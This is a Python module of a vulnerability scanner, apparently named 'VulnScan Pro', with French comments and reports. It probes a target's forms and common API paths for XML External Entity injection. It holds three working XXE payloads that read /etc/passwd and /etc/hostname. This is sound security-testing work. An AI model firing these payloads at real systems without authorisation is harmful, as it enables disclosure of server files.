"""
Module VulnScan Pro : xxe_scanner
Détecte les vulnérabilités XML External Entity (XXE) en injectant des payloads
dans les endpoints XML/JSON et les formulaires de la cible.

AVERTISSEMENT : À utiliser uniquement sur des cibles autorisées.
"""
import sys
import json
import argparse
import time
import re
from urllib.parse import urlparse
import requests
from bs4 import BeautifulSoup

sys.path.insert(0, '..')
from core.base_module import BaseModule


XXE_PAYLOADS = [
    # Classic XXE - file read
    '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
    # Blind XXE via error
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>',
    # XXE via parameter entity
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]><foo/>',
]

XXE_SIGNATURES = [
    r"root:.*:0:0:",
    r"daemon:.*:/",
    r"DOCTYPE",
    r"SYSTEM",
    r"xml parsing",
    r"XML parse error",
    r"entity.*not defined",
    r"Reference to undefined entity",
]

XXE_REFS = [
    "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
    "https://cwe.mitre.org/data/definitions/611.html",
    "https://portswigger.net/web-security/xxe",
    "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html",
]

XXE_RE = re.compile("|".join(XXE_SIGNATURES), re.IGNORECASE | re.MULTILINE)

XML_CONTENT_TYPES = [
    "application/xml",
    "text/xml",
    "application/soap+xml",
]

JSON_CONTENT_TYPES = [
    "application/json",
]


class Module(BaseModule):

    def run(self, url: str, depth: str = "normal", timeout: int = 30) -> dict:
        start = time.time()
        vulns = []
        seen = set()
        req_timeout = min(timeout, 12)

        try:
            session = requests.Session()
            session.headers["User-Agent"] = "VulnScan-Pro/1.0"
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"

            # 1. Detect XML endpoints by crawling links/forms
            xml_endpoints = set()
            try:
                resp = session.get(url, timeout=req_timeout, allow_redirects=True)
                soup = BeautifulSoup(resp.text, "html.parser")
                for form in soup.find_all("form"):
                    action = form.get("action", "")
                    method = form.get("method", "get").upper()
                    if action:
                        ep = action if action.startswith("http") else f"{base_url}{action}"
                    else:
                        ep = url
                    if method == "POST":
                        xml_endpoints.add(ep)
            except Exception:
                pass

            # 2. Add common XML/API endpoint paths
            common_paths = [
                "/api/xml", "/api/upload", "/upload", "/parse",
                "/api/v1/xml", "/soap", "/ws", "/xmlrpc", "/xmlrpc.php",
                "/api/import", "/api/feed",
            ]
            for path in common_paths:
                xml_endpoints.add(f"{base_url}{path}")

            # 3. Test each endpoint with XXE payloads
            tested = 0
            for endpoint in list(xml_endpoints)[:10]:
                if (time.time() - start) > (timeout * 0.8):
                    break
                for payload in XXE_PAYLOADS[:2]:
                    if endpoint in seen:
                        break
                    try:
                        resp = session.post(
                            endpoint,
                            data=payload,
                            headers={"Content-Type": "application/xml"},
                            timeout=req_timeout,
                            allow_redirects=True,
                        )
                        if XXE_RE.search(resp.text) or resp.status_code in (400, 500):
                            # Check for actual XXE indicators in response
                            if "root:" in resp.text or "entity" in resp.text.lower():
                                seen.add(endpoint)
                                vulns.append(self.vuln(
                                    name="XML External Entity (XXE) Injection détectée",
                                    severity="HIGH",
                                    cvss_score=8.2,
                                    cvss_vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L",
                                    cwe_id="CWE-611",
                                    endpoint=endpoint,
                                    payload=payload[:80] + "…",
                                    description=(
                                        f"L'endpoint '{endpoint}' traite du contenu XML externe sans restriction. "
                                        "Un payload XXE a provoqué une réponse révélatrice, permettant "
                                        "potentiellement la lecture de fichiers système ou des requêtes réseau internes."
                                    ),
                                    impact="Lecture de fichiers système, SSRF, déni de service (Billion Laughs), exfiltration de données.",
                                    evidence=f"Payload XXE envoyé à {endpoint}, réponse contenant des signatures de fichiers système ou d'entités XML.",
                                    recommendation=(
                                        "Désactiver le traitement des entités externes XML (DTD processing). "
                                        "Utiliser des parseurs XML sécurisés avec external entity disabled. "
                                        "Valider et sanitiser toutes les entrées XML avant traitement."
                                    ),
                                    references=XXE_REFS,
                                ))
                                break
                    except requests.exceptions.RequestException:
                        continue
                tested += 1
                if depth == "fast" and tested >= 3:
                    break

            # 4. Check if server accepts XML content-type header (indicator of XXE risk)
            if not vulns:
                try:
                    resp = session.post(
                        url,
                        data="<test/>",
                        headers={"Content-Type": "application/xml"},
                        timeout=req_timeout,
                    )
                    if resp.status_code not in (404, 405) and "xml" in resp.headers.get("Content-Type", "").lower():
                        vulns.append(self.vuln(
                            name="Endpoint XML détecté — risque XXE potentiel",
                            severity="HIGH",
                            cvss_score=8.2,
                            cvss_vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L",
                            cwe_id="CWE-611",
                            endpoint=url,
                            payload="<test/>",
                            description=(
                                "Le serveur accepte le Content-Type application/xml. "
                                "Si le parseur XML n'est pas correctement sécurisé, "
                                "il peut être vulnérable aux attaques XXE."
                            ),
                            impact="Lecture de fichiers système, SSRF, exfiltration de données internes.",
                            evidence="Serveur répond au Content-Type application/xml avec un corps XML valide.",
                            recommendation=(
                                "Désactiver le traitement des entités externes. "
                                "Utiliser un parseur XML avec entity expansion désactivé. "
                                "Valider le schéma XML avant tout traitement."
                            ),
                            references=XXE_REFS,
                        ))
                except requests.exceptions.RequestException:
                    pass

        except Exception as e:
            duration = int((time.time() - start) * 1000)
            return self.error("xxe_scanner", str(e), duration)

        duration = int((time.time() - start) * 1000)
        return self.result("xxe_scanner", vulns, duration)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="VulnScan Pro — XXE Scanner")
    parser.add_argument("--url",     required=True,        help="URL cible")
    parser.add_argument("--depth",   default="normal",     help="Profondeur du scan")
    parser.add_argument("--timeout", type=int, default=30, help="Timeout en secondes")
    args = parser.parse_args()

    module = Module()
    result = module.run(args.url, args.depth, args.timeout)
    print(json.dumps(result, ensure_ascii=False))
